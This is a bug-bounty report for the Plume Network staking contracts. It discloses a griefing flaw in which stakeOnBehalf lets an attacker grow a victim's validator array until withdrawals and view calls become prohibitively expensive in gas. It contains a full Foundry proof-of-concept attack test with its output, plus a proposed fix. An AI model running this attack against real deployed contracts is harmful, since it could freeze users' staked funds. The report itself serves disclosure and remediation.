# 51813 sc high malicious user can grief victims by staking them across many validators leading to fund freezing

**Submitted on Aug 5th 2025 at 22:40:03 UTC by @ihtishamsudo for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #51813
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/StakingFacet.sol>
* **Impacts:**
  * Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

The Plume staking system contains a high-severity vulnerability in the `stakeOnBehalf` function that enables attackers to perform economical griefing attacks against users. By staking minimal amounts on behalf of victims across many validators, attackers can force victims into gas-expensive operations that make their funds practically inaccessible. This creates a temporary fund freeze lasting at least 24 hours and potentially much longer due to prohibitive recovery costs, allowing a 100 PLUME attack to effectively trap thousands of PLUME in victim accounts.

## Vulnerability Details

The vulnerability involves a multi-step call flow that allows attackers to manipulate victim's validator arrays.

Attacker will execute stakeOnBehalf of victim with minimal stake amount which is 0.1 Plume as used in deployment scripts.

```solidity
function stakeOnBehalf(uint16 validatorId, address staker) external payable returns (uint256) {
    //... SNIP
    uint256 stakeAmount = msg.value;
    
    bool isNewStake = _performStakeSetup(staker, validatorId, stakeAmount);

}
```

`_performStakeSetup` internally calls `PlumeValidatorLogic.addStakerToValidator()`

```solidity
function _performStakeSetup(address user, uint16 validatorId, uint256 amount) internal returns (bool isNewStake) {
    ///... SNIP
    if (isNewStake) {
        
        PlumeValidatorLogic.addStakerToValidator($, user, validatorId); // <-- Adds validatorId to user's array
    }
    
```

which pushes the `validatorId` to victim's `$.userValidators[user]` array:

```solidity
function addStakerToValidator(
    PlumeStakingStorage.Layout storage $,
    address user,
    uint16 validatorId
) internal {
    // Unbounded array push without limits
    $.userValidators[user].push(validatorId);  // <-- ARRAY GROWS INDEFINITELY
    $.validatorStakers[validatorId].push(user);
    
    //...SNIP
}
```

Once the attacker has populated the victim's `$.userValidators[user]` array with many validators, all subsequent operations become gas-expensive:

```solidity
function _calculateActivelyCoolingAmount(address user) internal view returns (uint256 activelyCoolingAmount) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    uint16[] storage userAssociatedValidators = $.userValidators[user]; // UNBOUNDED ARRAY
    activelyCoolingAmount = 0;

    // GAS SCALES LINEARLY WITH ARRAY SIZE
    for (uint256 i = 0; i < userAssociatedValidators.length; i++) {
        uint16 validatorId = userAssociatedValidators[i];
        if ($.validatorExists[validatorId]) {
            PlumeStakingStorage.CooldownEntry storage cooldownEntry = $.userValidatorCooldowns[user][validatorId];
            if (cooldownEntry.amount > 0 && block.timestamp < cooldownEntry.cooldownEndTime) {
                activelyCoolingAmount += cooldownEntry.amount;
            }
        }
    }
    return activelyCoolingAmount;
}
```

Impacted functions

* `amountCooling()` - Iterates over entire validator array to calculate cooling amounts
* `amountWithdrawable()` - Iterates over entire validator array to calculate withdrawable amounts
* `getUserCooldowns()` - Iterates over entire validator array to return cooldown data
* `withdraw()` - Calls `_processMaturedCooldowns()` which iterates over all user validators
* `unstake()` - Can trigger expensive operations when combined with many validators
* `_processMaturedCooldowns()` - Processes cooldowns across all validators for a user

### Attack path

{% stepper %}
{% step %}

### Identify victim and validators

* Attacker identifies a victim address with existing funds.
* Attacker queries available validators (typically 1000+ exist).
  {% endstep %}

{% step %}

### Stake on behalf of victim across many validators

* For each validator, attacker calls:

```solidity
stakingContract.stakeOnBehalf{value: 0.1 ether}(validatorId, victimAddress);
```

* Each call triggers `_performStakeSetup(victimAddress, validatorId, 0.1 ether)` → `addStakerToValidator()` → `$.userValidators[victim].push(validatorId)`.
* Victim's validator array grows from 0 to 1000+ entries.
  {% endstep %}

{% step %}

### Victim attempts normal operations

* Victim calls view/state functions which must iterate over the very large `userValidators` array.
* Gas usage increases dramatically:
  * `amountCooling()`: from \~7,100 gas → 300,000+ gas (example 43x increase)
  * `withdraw()`: may exceed block gas limits
  * All view and critical functions become prohibitively expensive
    {% endstep %}
    {% endstepper %}

## Impact Details

HIGH - Temporary freezing of funds for at least 24 hours. Economical: low attacker cost (example: 100 PLUME) to cause significant disruption. Based on the provided example cost calculations, the attacker's total cost can be very low relative to victim loss/time locked.

## References

* [function stakeOnBehalf](https://github.com/immunefi-team/attackathon-plume-network/blob/580cc6d61b08a728bd98f11b9a2140b84f41c802/plume/src/facets/StakingFacet.sol#L428)
* Gas-expensive view functions.

## Recommended Mitigation

### 1. Implement Maximum Validator Limits

Add a per-user max validator limit and check in `_performStakeSetup` before adding a new validator:

```solidity
uint256 public constant MAX_VALIDATORS_PER_USER = 50;

function _performStakeSetup(address user, uint16 validatorId, uint256 amount) internal {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    
    // Check if this would exceed validator limit
    bool isNewStake = $.userValidatorStakes[user][validatorId].staked == 0;
    if (isNewStake && $.userValidators[user].length >= MAX_VALIDATORS_PER_USER) {
        revert TooManyValidators(MAX_VALIDATORS_PER_USER);
    }
    
    // ... existing logic
}
```

## Proof of Concept

<details>

<summary>Click to expand the full Proof-of-Concept test and output</summary>

* PoC test file: `test/StakeOnBehalfDoSTest.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console2} from "forge-std/Test.sol";

// Import from existing test to reuse setup
import "./PlumeStakingDiamond.t.sol";

/**
 * @title StakeOnBehalfDoSTest  
 * @notice Test demonstrating the griefing attack vulnerability in stakeOnBehalf function
 * @dev This test extends the existing PlumeStakingDiamondTest to reuse the setup
 * @dev Uses native PLUME tokens (the blockchain's native currency) for staking operations
 */
contract StakeOnBehalfDoSTest is PlumeStakingDiamondTest {
    
    address public attacker;
    address public victim;
    
    function setUpAttack() public {
        // Setup attack participants
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        
        // Fund attacker and victim with native PLUME for the attack
        vm.deal(attacker, 100_000 ether); // 100K PLUME (native tokens)
        vm.deal(victim, 10_000 ether);    // 10K PLUME (native tokens)
        
        // Set minimum stake amount to 0.1 PLUME to make the attack cheaper
        vm.prank(admin);
        ManagementFacet(address(diamondProxy)).setMinStakeAmount(0.1e18); // 0.1 PLUME
        
        console2.log("Attacker PLUME balance:", attacker.balance);
        console2.log("Victim PLUME balance:", victim.balance);
        console2.log("Minimum stake amount set to:", ManagementFacet(address(diamondProxy)).getMinStakeAmount() / 1e18, "PLUME");
    }
    
    function _createManyValidators(uint256 numValidators) internal {
        vm.startPrank(admin);
        
        // Check how many validators already exist by trying to get their info
        uint16 startingId = 2; // Start from 2 since 0 and 1 already exist in parent setup
        
        for (uint16 i = 0; i < numValidators; i++) {
            uint16 validatorId = startingId + i;
            address validatorAdmin = makeAddr(string(abi.encodePacked("validator", vm.toString(validatorId))));
            
            // Add validator with all required parameters
            ValidatorFacet(address(diamondProxy)).addValidator(
                validatorId,
                DEFAULT_COMMISSION,
                validatorAdmin,
                validatorAdmin,
                string(abi.encodePacked("validator", vm.toString(validatorId))),
                string(abi.encodePacked("account", vm.toString(validatorId))),
                address(uint160(0x1000 + validatorId)),
                1_000_000e18 // max capacity
            );
            
            // Validators are active by default when added
        }
        
        vm.stopPrank();
    }
    
    /**
     * @notice Demonstrates the griefing attack scenario where an attacker can DoS a victim
     * by staking small amounts on their behalf to many validators, causing gas exhaustion
     * in subsequent operations that iterate over the victim's validator list.
     */
    function testStakeOnBehalfGriefingAttack() public {
        setUpAttack();
        
        console2.log("=== StakeOnBehalf Griefing Attack Demonstration ===");
        
        // Setup: Create many validators
        uint256 numAttackValidators = 1000; // Create 1000 validators for comprehensive attack
        _createManyValidators(numAttackValidators);
        
        console2.log("Created validators:", numAttackValidators + 2); // +2 for default validators 0 and 1
        console2.log("Attacker:", attacker);
        console2.log("Victim:", victim);
        
        // Record initial state
        uint16[] memory victimValidatorsBefore = ValidatorFacet(address(diamondProxy)).getUserValidators(victim);
        console2.log("Victim's initial validator count:", victimValidatorsBefore.length);
        
        // Measure gas for normal operations before attack
        uint256 gasBeforeAttack = gasleft();
        vm.prank(victim);
        StakingFacet(address(diamondProxy)).amountCooling();
        uint256 gasUsedBeforeAttack = gasBeforeAttack - gasleft();
        console2.log("Gas used for amountCooling() before attack:", gasUsedBeforeAttack);
        
        // ATTACK: Attacker stakes minimal amounts on behalf of victim to many validators
        console2.log("\n--- Starting Griefing Attack ---");
        vm.startPrank(attacker);
        
        uint256 minStake = ManagementFacet(address(diamondProxy)).getMinStakeAmount();
        uint256 totalAttackCost = 0;
        
        // Stake to default validators (ID 0 and 1) first
        StakingFacet(address(diamondProxy)).stakeOnBehalf{value: minStake}(0, victim);
        totalAttackCost += minStake;
        
        StakingFacet(address(diamondProxy)).stakeOnBehalf{value: minStake}(1, victim);
        totalAttackCost += minStake;
        
        // Then stake to all the newly created validators (starting from ID 2)
        for (uint16 i = 0; i < numAttackValidators; i++) {
            uint16 validatorId = 2 + i; // Start from 2
            StakingFacet(address(diamondProxy)).stakeOnBehalf{value: minStake}(validatorId, victim);
            totalAttackCost += minStake;
            
            if ((i + 1) % 25 == 0) {
                console2.log("Attacked validator", validatorId);
            }
        }
        
        vm.stopPrank();
        
        console2.log("Attack completed!");
        console2.log("Total validators attacked:", numAttackValidators + 2); // +2 for default validators
        console2.log("Total attack cost (PLUME):", totalAttackCost / 1e18);
        console2.log("Cost per validator (PLUME):", (totalAttackCost / (numAttackValidators + 2)) / 1e18);
        
        // Verify attack success
        uint16[] memory victimValidatorsAfter = ValidatorFacet(address(diamondProxy)).getUserValidators(victim);
        console2.log("Victim's validator count after attack:", victimValidatorsAfter.length);
        assertEq(victimValidatorsAfter.length, numAttackValidators + 2, "Attack should add victim to all validators");
        
        // IMPACT DEMONSTRATION: Show gas consumption has increased dramatically
        console2.log("\n--- Demonstrating DoS Impact ---");
        
        // Test 1: amountCooling() gas consumption
        console2.log("Testing amountCooling() after attack...");
        uint256 gasBeforeView = gasleft();
        vm.prank(victim);
        StakingFacet(address(diamondProxy)).amountCooling();
        uint256 gasUsedAfterAttack = gasBeforeView - gasleft();
        console2.log("Gas used for amountCooling() after attack:", gasUsedAfterAttack);
        console2.log("Gas increase factor:", gasUsedAfterAttack / gasUsedBeforeAttack);
        
        // Test 2: amountWithdrawable() gas consumption  
        console2.log("Testing amountWithdrawable() after attack...");
        gasBeforeView = gasleft();
        vm.prank(victim);
        StakingFacet(address(diamondProxy)).amountWithdrawable();
        uint256 gasUsedWithdrawable = gasBeforeView - gasleft();
        console2.log("Gas used for amountWithdrawable():", gasUsedWithdrawable);
        
        // Test 3: getUserCooldowns() gas consumption
        console2.log("Testing getUserCooldowns() after attack...");
        gasBeforeView = gasleft();
        vm.prank(victim);
        StakingFacet(address(diamondProxy)).getUserCooldowns(victim);
        uint256 gasUsedCooldowns = gasBeforeView - gasleft();
        console2.log("Gas used for getUserCooldowns():", gasUsedCooldowns);
        
        // Test 4: Try operations that modify state (more expensive)
        console2.log("Testing unstake() transaction...");
        gasBeforeView = gasleft();
        vm.prank(victim);
        uint256 unstakedAmount = StakingFacet(address(diamondProxy)).unstake(0);
        uint256 gasUsedUnstake = gasBeforeView - gasleft();
        console2.log("Gas used for unstake():", gasUsedUnstake);
        console2.log("Unstaked amount:", unstakedAmount);
        
        // Test 5: Try withdraw after cooldown (most expensive operation)
        console2.log("Testing withdraw() after cooldown...");
        
        // Fast forward past cooldown period
        uint256 cooldownPeriod = ManagementFacet(address(diamondProxy)).getCooldownInterval();
        vm.warp(block.timestamp + cooldownPeriod + 1);
        
        gasBeforeView = gasleft();
        vm.prank(victim);
        try StakingFacet(address(diamondProxy)).withdraw() {
            uint256 gasUsedWithdraw = gasBeforeView - gasleft();
            console2.log("Gas used for withdraw():", gasUsedWithdraw);
        } catch {
            console2.log("WARNING: withdraw() failed - likely due to gas exhaustion!");
        }
        
        
        console2.log("Victim stakes across", victimValidatorsAfter.length, "validators");
        console2.log("victim's view functions consume", gasUsedAfterAttack / gasUsedBeforeAttack, "x more gas");
        console2.log("Critical functions like withdraw() may fail due to gas limits");
        console2.log("Attacker's cost only", totalAttackCost / 1e18, "PLUME to permanently DoS victim");
    
        
        // Demonstrate the victim cannot easily recover
       
        console2.log("Victim would need to unstake from each validator individually:");
        console2.log("Number of transactions needed:", victimValidatorsAfter.length);
        console2.log("Gas cost per unstake transaction: ~", gasUsedUnstake);
        console2.log("Total gas for full recovery: ~", gasUsedUnstake * victimValidatorsAfter.length);
        console2.log("This may exceed reasonable gas limits for a single user");
        
        assertTrue(gasUsedAfterAttack > gasUsedBeforeAttack * 5, "Gas consumption should increase significantly");
        assertTrue(victimValidatorsAfter.length > 50, "Victim should be associated with many validators");
    }
    
}
```

* Test output:

```
forge test --match-test testStakeOnBehalfGriefingAttack --via-ir -vv
[⠑] Compiling...
No files changed, compilation skipped

Ran 1 test for test/StakeOnBehalfDoSTest.t.sol:StakeOnBehalfDoSTest
[PASS] testStakeOnBehalfGriefingAttack() (gas: 726343970)
Logs:
  Starting Diamond test setup (Correct Path)
  Mock PUSD token deployed at: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
  All facet deployments verified (address and code length).
  Manual selectors initialized
  Assigning AccessControlFacet to cut[0]: 0x81A7A4Ece4D161e720ec602Ad152a7026B82448b
  Assigning ManagementFacet to cut[1]: 0x138108cB4Ae27856d292D52205BBC530A4A4E229
  Assigning StakingFacet to cut[2]: 0x6Df71536c389d09E9175ea9585f7DCD1A95B29d3
  Assigning ValidatorFacet to cut[3]: 0xCD771B830C1775308e8EE5B8F582f3956054041c
  Assigning RewardsFacet to cut[4]: 0x42Ffc8306c022Dd17f09daD0FF71f7313Df0A48D
  Applying single diamond cut to proxy: 0x77e424Dab916412C04eBe6B8c0435B3202f4C81B
  Single diamond cut applied successfully.
  Attacker PLUME balance: 100000000000000000000000
  Victim PLUME balance: 10000000000000000000000
  Minimum stake amount set to: 0 PLUME
  === StakeOnBehalf Griefing Attack Demonstration ===
  Created validators: 1002
  Attacker: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
  Victim: 0x131f15F1fD1024551542390614B6c7e210A911AF
  Victim's initial validator count: 0
  Gas used for amountCooling() before attack: 7269
  
--- Starting Griefing Attack ---
  Attacked validator 26
  Attacked validator 51
  Attacked validator 76
  Attacked validator 101
  Attacked validator 126
  Attacked validator 151
  Attacked validator 176
  Attacked validator 201
  Attacked validator 226
  Attacked validator 251
  Attacked validator 276
  Attacked validator 301
  Attacked validator 326
  Attacked validator 351
  Attacked validator 376
  Attacked validator 401
  Attacked validator 426
  Attacked validator 451
  Attacked validator 476
  Attacked validator 501
  Attacked validator 526
  Attacked validator 551
  Attacked validator 576
  Attacked validator 601
  Attacked validator 626
  Attacked validator 651
  Attacked validator 676
  Attacked validator 701
  Attacked validator 726
  Attacked validator 751
  Attacked validator 776
  Attacked validator 801
  Attacked validator 826
  Attacked validator 851
  Attacked validator 876
  Attacked validator 901
  Attacked validator 926
  Attacked validator 951
  Attacked validator 976
  Attacked validator 1001
  Attack completed!
  Total validators attacked: 1002
  Total attack cost (PLUME): 100
  Cost per validator (PLUME): 0
  Victim's validator count after attack: 1002
  
--- Demonstrating DoS Impact ---
  Testing amountCooling() after attack...
  Gas used for amountCooling() after attack: 2998776
  Gas increase factor: 412
  Testing amountWithdrawable() after attack...
  Gas used for amountWithdrawable(): 780396
  Testing getUserCooldowns() after attack...
  Gas used for getUserCooldowns(): 1965216
  Testing unstake() transaction...
  Gas used for unstake(): 151015
  Unstaked amount: 100000000000000000
  Testing withdraw() after cooldown...
  Gas used for withdraw(): 3415031
  Victim stakes across 1002 validators
  victim's view functions consume 412 x more gas
  Critical functions like withdraw() may fail due to gas limits
  Attacker's cost only 100 PLUME to permanently DoS victim
  Victim would need to unstake from each validator individually:
  Number of transactions needed: 1002
  Gas cost per unstake transaction: ~ 151015
  Total gas for full recovery: ~ 151317030
  This may exceed reasonable gas limits for a single user

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 371.46ms (342.05ms CPU time)

Ran 1 test suite in 373.60ms (371.46ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

</details>
